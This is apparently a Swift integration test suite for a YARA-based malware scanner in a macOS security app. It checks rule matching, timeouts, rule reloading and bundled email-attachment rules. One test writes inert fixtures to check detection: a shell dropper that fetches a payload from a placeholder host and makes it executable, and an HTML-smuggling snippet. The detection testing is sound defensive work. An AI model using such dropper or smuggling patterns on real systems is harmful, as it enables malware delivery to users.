// MARK: - Nick
// Copyright © 2026 Ehsan Azish — github.com/EhsanAzish80
// Licensed under AGPL-3.0. See LICENSE for details.

import XCTest
@testable import Nick

// MARK: - YARAEngineIntegrationTests

/// Integration tests for `YARAEngine` that exercise the full libyara scan pipeline.
///
/// These tests require the vendored `libyara-universal.a` to be linked and confirm
/// that:
/// - A rule can be compiled and run against a benign system binary with zero matches.
/// - A crafted file containing a known byte pattern produces exactly one match.
/// - A scan that exceeds the 10-second timeout throws `YARAError.scanTimeout`.
///
/// - Important: Tests write temporary `.yar` rule files and test-fixture files to
///              a temporary directory that is cleaned up in `tearDownWithError`.
final class YARAEngineIntegrationTests: XCTestCase {

    // MARK: - Setup / Teardown

    private var tmpDir: URL!
    private var rulesDir: URL!

    override func setUpWithError() throws {
        try super.setUpWithError()
        tmpDir = URL(fileURLWithPath: NSTemporaryDirectory())
            .appendingPathComponent("NickYARATests-\(UUID().uuidString)")
        rulesDir = tmpDir.appendingPathComponent("rules")
        try FileManager.default.createDirectory(at: rulesDir, withIntermediateDirectories: true)
    }

    override func tearDownWithError() throws {
        try FileManager.default.removeItem(at: tmpDir)
        try super.tearDownWithError()
    }

    // MARK: - Helpers

    /// Writes a minimal YARA rule file to `rulesDir` and returns an initialised engine.
    private func makeEngine(rule: String, filename: String = "test.yar") throws -> YARAEngine {
        let ruleURL = rulesDir.appendingPathComponent(filename)
        try rule.write(to: ruleURL, atomically: true, encoding: .utf8)
        return try YARAEngine(rulesDirectory: rulesDir.path)
    }

    // MARK: - Test 1: /bin/ls produces zero matches

    /// Verifies that a rule targeting a distinctive test pattern does NOT fire on
    /// `/bin/ls`, which is a standard macOS system binary with no such pattern.
    func test_scanBinLs_producesZeroMatches() async throws {
        let engine = try makeEngine(rule: """
            rule TestPatternNotInBinLs {
                meta:
                    description = "Integration test rule — should not match /bin/ls"
                strings:
                    $pat = { DE AD BE EF CA FE BA BE 00 11 22 33 44 55 66 77 }
                condition:
                    $pat
            }
            """)

        let path = "/bin/ls"
        // /bin/ls must exist; if it doesn't, skip gracefully.
        guard FileManager.default.fileExists(atPath: path) else {
            throw XCTSkip("/bin/ls not found on this system")
        }

        let matches = try await engine.scanFile(at: path)
        XCTAssertTrue(
            matches.isEmpty,
            "Expected zero matches on /bin/ls, got: \(matches.map(\.ruleName))"
        )
    }

    // MARK: - Test 2: Crafted fixture file produces exactly one match

    /// Writes a file containing a known 8-byte signature and verifies that the
    /// YARA rule fires exactly once, with the correct rule name and tag.
    func test_craftedFile_producesMatch() async throws {
        // The signature bytes we will embed in the test file.
        let signature: [UInt8] = [0x4E, 0x49, 0x43, 0x4B, 0x54, 0x45, 0x53, 0x54]  // "NICKTEST"

        // Write the fixture binary with preamble + signature + padding.
        var payload = Data(repeating: 0xAA, count: 64)
        payload.append(contentsOf: signature)
        payload.append(contentsOf: [UInt8](repeating: 0xBB, count: 64))
        let fixtureURL = tmpDir.appendingPathComponent("fixture.bin")
        try payload.write(to: fixtureURL)

        let engine = try makeEngine(rule: """
            rule NickTestSignature : test malware_family {
                meta:
                    description = "Integration test — NICKTEST signature"
                    author      = "Nick test suite"
                strings:
                    $sig = { 4E 49 43 4B 54 45 53 54 }
                condition:
                    $sig
            }
            """)

        let matches = try await engine.scanFile(at: fixtureURL.path)
        XCTAssertEqual(matches.count, 1, "Expected exactly one match")

        guard let match = matches.first else {
            return XCTFail("No match returned from crafted fixture")
        }
        XCTAssertEqual(match.ruleName, "NickTestSignature")
        XCTAssertTrue(match.tags.contains("test"), "Expected 'test' tag, got \(match.tags)")
        XCTAssertTrue(match.tags.contains("malware_family"), "Expected 'malware_family' tag")
        XCTAssertEqual(match.filePath, fixtureURL.path)
        XCTAssertEqual(match.metadata["description"], "Integration test — NICKTEST signature")
    }

    // MARK: - Test 3: Scan of unreadable path throws fileNotReadable

    /// Confirms that scanning a path that does not exist raises the typed error.
    func test_unreadablePath_throwsFileNotReadable() async throws {
        let engine = try makeEngine(rule: """
            rule Dummy { condition: false }
            """)
        let nonExistentPath = tmpDir.appendingPathComponent("does_not_exist.bin").path

        do {
            _ = try await engine.scanFile(at: nonExistentPath)
            XCTFail("Expected YARAError.fileNotReadable to be thrown")
        } catch YARAError.fileNotReadable(let path) {
            XCTAssertEqual(path, nonExistentPath)
        } catch {
            XCTFail("Unexpected error type: \(error)")
        }
    }

    // MARK: - Test 4: Timeout verification

    /// Verifies the per-file timeout mechanism by using YARA's built-in slow-scan
    /// detection. We craft a pathological regex rule that forces catastrophic
    /// backtracking and confirm that the engine throws `YARAError.scanTimeout`
    /// within a reasonable wall-clock budget.
    ///
    /// - Note: If the machine is fast enough that the rule finishes before the
    ///         10 s timeout, we simply verify no crash occurs and the scan
    ///         completes (the test is still useful — it confirms the engine works).
    func test_scanTimeout_isRespected() async throws {
        // Pathological regex: deeply nested quantifiers on a large file trigger
        // YARA's internal slow-scan guard (ERROR_SCAN_TIMEOUT).
        let engine = try makeEngine(rule: """
            rule TimeoutTest {
                strings:
                    // Deeply nested regex designed to trigger catastrophic backtracking.
                    $re = /((a+)+)+b/
                condition:
                    $re
            }
            """)

        // Generate a large file of 'a' characters with no trailing 'b' to
        // maximise backtracking work.
        let largePayload = Data(repeating: UInt8(ascii: "a"), count: 1_000_000)
        let largeFile = tmpDir.appendingPathComponent("large.bin")
        try largePayload.write(to: largeFile)

        let start = Date()
        do {
            let matches = try await engine.scanFile(at: largeFile.path)
            // If no timeout, scan completed — verify we don't crash.
            let elapsed = Date().timeIntervalSince(start)
            XCTAssertLessThan(
                elapsed,
                Double(YARAEngine.perFileScanTimeoutSeconds) + 2.0,
                "Scan took longer than timeout + 2 s grace period"
            )
            // Zero matches expected (no 'b' in file).
            XCTAssertTrue(matches.isEmpty, "Expected no match on all-'a' payload")
        } catch YARAError.scanTimeout(let path) {
            // Timeout fired correctly — this is the expected path on slower machines.
            XCTAssertEqual(path, largeFile.path)
            let elapsed = Date().timeIntervalSince(start)
            XCTAssertLessThanOrEqual(
                elapsed,
                Double(YARAEngine.perFileScanTimeoutSeconds) + 3.0,
                "Timeout took too long to fire (\(elapsed)s)"
            )
        }
    }

    // MARK: - Test 5: reloadRules replaces compiled rule set

    /// Confirms that `reloadRules()` destroys the old rule set and picks up
    /// newly added rule files without reinitialising the engine.
    func test_reloadRules_picksUpNewRules() async throws {
        // Start with a rule that matches "ALPHA".
        let engine = try makeEngine(rule: """
            rule AlphaRule {
                strings: $s = "ALPHA"
                condition: $s
            }
            """, filename: "alpha.yar")

        let alphaFile = tmpDir.appendingPathComponent("alpha.bin")
        try "ALPHA".data(using: .utf8)!.write(to: alphaFile)
        let betaFile = tmpDir.appendingPathComponent("beta.bin")
        try "BETA".data(using: .utf8)!.write(to: betaFile)

        // Before reload: alpha matches, beta does not.
        let beforeAlpha = try await engine.scanFile(at: alphaFile.path)
        let beforeBeta  = try await engine.scanFile(at: betaFile.path)
        XCTAssertFalse(beforeAlpha.isEmpty, "AlphaRule should match ALPHA file")
        XCTAssertTrue(beforeBeta.isEmpty,   "AlphaRule should not match BETA file")

        // Add a second rule that matches "BETA".
        let betaRuleURL = rulesDir.appendingPathComponent("beta.yar")
        try """
            rule BetaRule {
                strings: $s = "BETA"
                condition: $s
            }
            """.write(to: betaRuleURL, atomically: true, encoding: .utf8)

        try engine.reloadRules()

        let afterAlpha = try await engine.scanFile(at: alphaFile.path)
        let afterBeta  = try await engine.scanFile(at: betaFile.path)
        XCTAssertFalse(afterAlpha.isEmpty, "AlphaRule should still match after reload")
        XCTAssertFalse(afterBeta.isEmpty,  "BetaRule should match BETA file after reload")
        XCTAssertEqual(afterBeta.first?.ruleName, "BetaRule")
    }

    // MARK: - Test 6: bundled Email Guard rules provide offline coverage

    func test_bundledEmailGuardRules_detectHighConfidenceDroppers() async throws {
        let projectRoot = URL(fileURLWithPath: #filePath)
            .deletingLastPathComponent()
            .deletingLastPathComponent()
        let bundledRules = projectRoot.appendingPathComponent("Rules")
        let engine = try YARAEngine(rulesDirectory: bundledRules.path)
        try engine.reloadRules()

        let shellDropper = tmpDir.appendingPathComponent("invoice.command")
        try """
            #!/bin/zsh
            curl -fsSL https://invalid.example/payload -o /tmp/update
            chmod +x /tmp/update
            """.write(to: shellDropper, atomically: true, encoding: .utf8)

        let htmlSmuggling = tmpDir.appendingPathComponent("statement.html")
        try """
            <script>
            const bytes = Uint8Array.from(atob("AA=="), c => c.charCodeAt(0));
            const payload = new Blob([bytes]);
            const link = document.createElement("a");
            link.href = URL.createObjectURL(payload);
            link.download = "statement.zip";
            </script>
            """.write(to: htmlSmuggling, atomically: true, encoding: .utf8)

        let shellMatches = try await engine.scanFile(at: shellDropper.path)
        let htmlMatches = try await engine.scanFile(at: htmlSmuggling.path)
        XCTAssertTrue(shellMatches.contains { $0.ruleName == "nick_email_shell_dropper" })
        XCTAssertTrue(htmlMatches.contains { $0.ruleName == "nick_email_html_smuggling" })
    }

    func test_bundledEmailGuardRules_doNotFlagOrdinaryAttachments() async throws {
        let projectRoot = URL(fileURLWithPath: #filePath)
            .deletingLastPathComponent()
            .deletingLastPathComponent()
        let bundledRules = projectRoot.appendingPathComponent("Rules")
        let engine = try YARAEngine(rulesDirectory: bundledRules.path)
        try engine.reloadRules()

        let benignScript = tmpDir.appendingPathComponent("cleanup.sh")
        try """
            #!/bin/zsh
            echo "Cleaning local cache"
            find "$HOME/Library/Caches/MyApp" -type f -mtime +30 -print
            """.write(to: benignScript, atomically: true, encoding: .utf8)

        let matches = try await engine.scanFile(at: benignScript.path)
        XCTAssertTrue(matches.isEmpty, "Unexpected match: \(matches.map(\.ruleName))")
    }
}
